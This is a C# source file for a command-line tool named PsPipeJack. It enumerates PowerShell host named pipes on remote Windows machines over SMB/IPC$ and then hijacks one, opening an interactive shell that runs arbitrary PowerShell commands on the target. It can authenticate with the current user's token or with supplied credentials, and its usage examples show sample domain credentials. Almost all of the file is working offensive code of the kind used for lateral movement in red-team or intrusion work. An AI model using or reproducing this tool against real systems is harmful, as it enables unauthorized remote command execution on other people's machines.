using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.IO;
using System.Security;
using SMBLibrary;
using SMBLibrary.Client;
using System.Linq;

static class Program
{

    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
    static extern int WNetAddConnection2(ref NETRESOURCE netResource, string? password, string? username, int flags);

    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
    static extern int WNetCancelConnection2(string name, int flags, bool force);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct NETRESOURCE
    {
        public int dwScope, dwType, dwDisplayType, dwUsage;
        public string? lpLocalName, lpRemoteName, lpComment, lpProvider;
    }
    static void Main(string[] args)
    {
        args = args.Where(a => !string.IsNullOrEmpty(a)).ToArray();
        if (args.Length < 1) { PrintUsage(); return; }

        string mode = args[0].ToLower();

        if (mode == "--enumerate" || mode == "-e")
        {
            if (args.Length < 4)
            {
                Console.WriteLine("[!] Error: --enumerate requires a server, username, and password.\n");
                PrintUsage();
                return;
            }
            Enumerate(args[1], args[2], args[3]);
        }
        else if (mode == "--connect" || mode == "-c")
        {
            if (args.Length < 3)
            {
                Console.WriteLine("[!] Error: --connect requires a server name and pipe name.\n");
                PrintUsage();
                return;
            }
            string? user = args.Length >= 4 ? args[3] : null;
            string? pass = args.Length >= 5 ? args[4] : null;
            PipeConnect(args[1], args[2], user, pass);
        }
        else
        {
            Console.WriteLine($"[!] Error: Unknown option '{args[0]}'.\n");
            PrintUsage();
        }
    }
    static string? NullIfEmpty(this string s) => string.IsNullOrEmpty(s) ? null : s;
    static void Enumerate(string serverName, string userArg, string password)
    {
        string domain   = string.Empty;
        string username = userArg;

        if (userArg.Contains('\\'))
        {
            var parts = userArg.Split(new[] { '\\' }, 2);
            domain   = parts[0];
            username = parts[1];
        }

        Console.WriteLine($"[*] Enumerating pipes on \\\\{serverName} as {domain}\\{username} ...\n");

        var client = new SMB2Client();

        if (!client.Connect(serverName, SMBTransportType.DirectTCPTransport))
        {
            WriteError("[!] Connection failed — host unreachable or port 445 closed.");
            return;
        }

        NTStatus status = client.Login(domain, username, password, AuthenticationMethod.NTLMv2);
        if (status != NTStatus.STATUS_SUCCESS)
        {
            WriteError($"[!] Authentication failed: {status}");
            client.Disconnect();
            return;
        }

        Console.WriteLine("[+] Authenticated successfully");

        ISMBFileStore fileStore = client.TreeConnect("IPC$", out status);
        if (status != NTStatus.STATUS_SUCCESS)
        {
            WriteError($"[!] IPC$ connect failed: {status}");
            client.Logoff();
            client.Disconnect();
            return;
        }

        Console.WriteLine($"[+] Connected to \\\\{serverName}\\IPC$\n");

        object dirHandle;
        FileStatus fileStatus;
        status = fileStore.CreateFile(
            out dirHandle,
            out fileStatus,
            string.Empty,
            AccessMask.GENERIC_READ,
            SMBLibrary.FileAttributes.Directory,
            ShareAccess.Read | ShareAccess.Write,
            CreateDisposition.FILE_OPEN,
            CreateOptions.FILE_DIRECTORY_FILE,
            null);

        if (status != NTStatus.STATUS_SUCCESS)
        {
            WriteError($"[!] Failed to open pipe directory: {status}");
            client.Logoff();
            client.Disconnect();
            return;
        }

        List<QueryDirectoryFileInformation> fileList;
        fileStore.QueryDirectory(out fileList, dirHandle, "*", FileInformationClass.FileDirectoryInformation);
        fileStore.CloseFile(dirHandle);
        client.Logoff();
        client.Disconnect();

        var pipes = new List<string>();
        foreach (var entry in fileList)
        {
            var info = new FileDirectoryInformation(entry.GetBytes(), 0);
            if (!string.IsNullOrEmpty(info.FileName))
                pipes.Add(info.FileName);
        }

        PrintPipes(serverName, pipes);
    }

    static void PipeConnect(string serverName, string pipeName, string? userArg, string? passArg)
    {
        Console.WriteLine($"[*] Connecting to \\\\{serverName}\\pipe\\{pipeName} ...");

        string ipcPath  = $@"\\{serverName}\IPC$";
        bool weOpened   = false;

        try
        {
            if (userArg != null && passArg != null)
            {
                var nr = new NETRESOURCE { dwType = 0, lpRemoteName = ipcPath };
                int result = WNetAddConnection2(ref nr, passArg, userArg, 0);

                if (result != 0 && result != 1219)
                {
                    WriteError($"[!] WNetAddConnection2 failed (Win32 error {result}).");
                    if (result == 1326) WriteError("Logon failure — check credentials.");
                    if (result == 53)   WriteError("Host unreachable.");
                    if (result == 5)    WriteError("Access denied.");
                    return;
                }

                weOpened = result == 0;
                Console.WriteLine($"[+] Authenticated to {ipcPath} as {userArg}");
            }

            var connInfo = new NamedPipeConnectionInfo(pipeName) { ServerName = serverName };
            using var runspace = RunspaceFactory.CreateRunspace(connInfo);

            try
            {
                runspace.Open();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Connection failed: {ex.Message}");
                return;
            }

            Console.WriteLine("[+] Connected! Type 'exit' to quit.\n");

            using var ps = PowerShell.Create();
            ps.Runspace = runspace;

            while (true)
            {
                Console.Write("PS> ");
                string? input = Console.ReadLine();

                if (string.IsNullOrWhiteSpace(input)) continue;
                if (input.Trim().Equals("exit", StringComparison.OrdinalIgnoreCase)) break;

                ps.Commands.Clear();
                ps.AddScript(input);

                try
                {
                    var results = ps.Invoke();
                    foreach (var result in results)
                        if (result != null)
                            Console.WriteLine(result.ToString());

                    if (ps.Streams.Error.Count > 0)
                    {
                        foreach (var error in ps.Streams.Error)
                            WriteError(error.ToString());
                        ps.Streams.Error.Clear();
                    }
                }
                catch (Exception ex)
                {
                    WriteError($"[!] Exception: {ex.Message}");
                }
            }

            Console.WriteLine("Disconnected.");
        }
        finally
        {
            if (weOpened)
                WNetCancelConnection2(ipcPath, 0, false);
        }
    }

    static void PrintPipes(string serverName, List<string> pipes)
    {
        if (pipes.Count == 0) { Console.WriteLine("No pipes found."); return; }

        pipes.Sort(StringComparer.OrdinalIgnoreCase);

        Console.WriteLine("Pipes Found:");
        var psHostPipes = pipes.FindAll(p => p.StartsWith("PSHost", StringComparison.OrdinalIgnoreCase));
        if (psHostPipes.Count > 0)
        {
            foreach (var pipe in psHostPipes)
                Console.WriteLine($"{pipe}");
        }
    }

    static void WriteError(string message)
    {
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine(message);
        Console.ResetColor();
    }

 

    static void PrintUsage()
    {
        Console.WriteLine("Usage: PsPipeJack.exe <command> [arguments]\n");

        Console.WriteLine("Commands:");
        Console.WriteLine("  --enumerate   (-e)   List all PowerShell named pipes on a remote machine");
        Console.WriteLine("  --connect     (-c)   Connect to a PowerShell named pipe on a remote machine\n");

        Console.WriteLine("──────────────────────────────────────────────────────────────");
        Console.WriteLine("  --enumerate <server> <domain\\user> <password>\n");
        Console.WriteLine("  Arguments:");
        Console.WriteLine("    <server>          [required]  IP address or hostname of the remote machine");
        Console.WriteLine("    <domain\\user>     [required]  Credentials to authenticate with (e.g. CORP\\jdoe)");
        Console.WriteLine("    <password>        [required]  Password for the specified user\n");
        Console.WriteLine("  Notes:");
        Console.WriteLine("    Enumerate always requires explicit credentials. It authenticates");
        Console.WriteLine("    directly to the remote machine over SMB/IPC$ and will not fall");
        Console.WriteLine("    back to the current user's access token.\n");

        Console.WriteLine("──────────────────────────────────────────────────────────────");
        Console.WriteLine("  --connect <server> <pipe> [domain\\user] [password]\n");
        Console.WriteLine("  Arguments:");
        Console.WriteLine("    <server>          [required]  IP address or hostname of the remote machine");
        Console.WriteLine("    <pipe>            [required]  Full name of the named pipe to connect to");
        Console.WriteLine("    <domain\\user>     [optional]  Credentials to authenticate with (e.g. CORP\\jdoe)");
        Console.WriteLine("    <password>        [optional]  Password for the specified user\n");
        Console.WriteLine("  Notes:");
        Console.WriteLine("    Connect supports two authentication modes:");
        Console.WriteLine("      Current token:   Omit domain\\user and password. The current user's");
        Console.WriteLine("                       Windows access token is used automatically via SSPI.");
        Console.WriteLine("      Credentials:     Supply domain\\user and password. An authenticated");
        Console.WriteLine("                       IPC$ session is established first, then the pipe");
        Console.WriteLine("                       connection rides that session.\n");

        Console.WriteLine("──────────────────────────────────────────────────────────────");
        Console.WriteLine("Examples:");
        Console.WriteLine("  PsPipeJack --enumerate 192.168.1.100 CORP\\jdoe Passw0rd!");
        Console.WriteLine("  PsPipeJack --connect   192.168.1.100 PSHost.134214327970160016.3492.DefaultAppDomain.powershell");
        Console.WriteLine("  PsPipeJack --connect   192.168.1.100 PSHost.134214327970160016.3492.DefaultAppDomain.powershell CORP\\jdoe Passw0rd!");
        Console.WriteLine();
    }
}
